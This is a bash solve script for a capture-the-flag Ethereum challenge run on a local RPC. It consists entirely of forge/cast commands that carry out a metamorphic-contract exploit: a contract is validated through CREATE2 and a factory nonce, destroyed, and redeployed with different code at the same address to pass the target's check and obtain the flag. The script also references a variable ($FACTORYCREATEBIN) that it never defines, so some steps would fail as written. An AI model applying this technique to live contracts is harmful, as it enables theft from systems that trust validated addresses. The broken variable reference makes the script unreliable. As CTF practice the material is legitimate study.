
```bash
export RPC=http://localhost/rpc
export PK=0xca11ab1ec0ffee000002a575fa5f74540719ba065a610cba6497cdbf22cd5cdb
export TARGET=0xAC254Af2552c6A32A9766b7865B3f1775f03c770
export ADDR=0x277506E301F0907b9bB7B954eB5B87aad9DABe92

forge create solve/Create2Factory.sol:Create2Factory -r $RPC --private-key $PK --broadcast
export CREATE2FACTORY=0xE4eb761E3a75a9ECEF586A1c2A3daDAdCB4f901F
export CREATEFACTORYBIN=$(forge inspect solve/CreateFactory.sol:CreateFactory bytecode --no-metadata)
export SALT=0x1337000000000000000000000000000000000000000000000000000000001337
cast call $CREATE2FACTORY "computeAddress(bytes32,bytes32)" $SALT $(cast keccak $CREATEFACTORYBIN) -r $RPC
export CREATEFACTORY=0x8756e28448c433e99b6749a71b3d74df6200387c

cast send $CREATE2FACTORY "deploy(uint256,bytes32,bytes)" 0 $SALT $FACTORYCREATEBIN -r $RPC --private-key $PK
cast code $CREATEFACTORY -r $RPC
# Code is present

export TRANSIENT1BIN=$(forge inspect solve/Transient1.sol:Transient1 bytecode --no-metadata)
export NONCE=$(cast nonce $CREATEFACTORY -r $RPC)

cast ca $CREATEFACTORY --nonce $NONCE
export TRANSIENT1=0xe479eE4ed6fb17C1194acCA2073b1D6dC8960f4C

cast send $CREATEFACTORY "deploy(uint256,bytes)" 0 $TRANSIENT1BIN  -r $RPC --private-key $PK
cast code $TRANSIENT1 -r $RPC
# 0x608033ff

cast send $TARGET "validate(address)" $TRANSIENT1 -r $RPC --private-key $PK
cast call $TARGET "validContracts(address)" $TRANSIENT1 -r $RPC
# 0x0000000000000000000000000000000000000000000000000000000000000001

cast send $CREATEFACTORY "destroy()" -r $RPC --private-key $PK
cast send $TRANSIENT1 "justcallthecontractwithrandomfunction()" -r $RPC --private-key $PK
cast code $CREATEFACTORY -r $RPC
# 0x
cast code $TRANSIENT1 -r $RPC
# 0x

cast send $CREATE2FACTORY "deploy(uint256,bytes32,bytes)" 0 $SALT $FACTORYCREATEBIN -r $RPC --private-key $PK
cast code $CREATEFACTORY -r $RPC
# Code is back

export TRANSIENT2BIN=$(forge inspect solve/Transient2.sol:Transient2 bytecode --no-metadata)
export NONCE=$(cast nonce $CREATEFACTORY -r $RPC)
cast send $CREATEFACTORY "deploy(uint256,bytes)" 0 $TRANSIENT2BIN  -r $RPC --private-key $PK

cast send $TARGET "flag(address)" $TRANSIENT1 -r $RPC --private-key $PK

cast call $TARGET "isSolved()" -r $RPC
```